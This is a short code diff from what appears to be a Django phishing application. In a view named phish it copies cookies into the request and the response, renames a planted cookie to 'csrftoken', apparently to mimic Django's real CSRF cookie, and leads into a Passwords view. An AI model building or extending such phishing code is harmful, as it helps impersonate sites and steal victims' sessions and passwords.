@@ -20,7 +20,7 @@ def phish(request):
 		request.META[c.name]=c.value
 		response.set_cookie(c.name,c.value)
 	#return render(request,"phishing.html")
-	response.set_cookie('csrf', value=str(csrf_c))
+	response.set_cookie('csrftoken', value=str(csrf_c))
 	return response
 
 def Passwords(request):
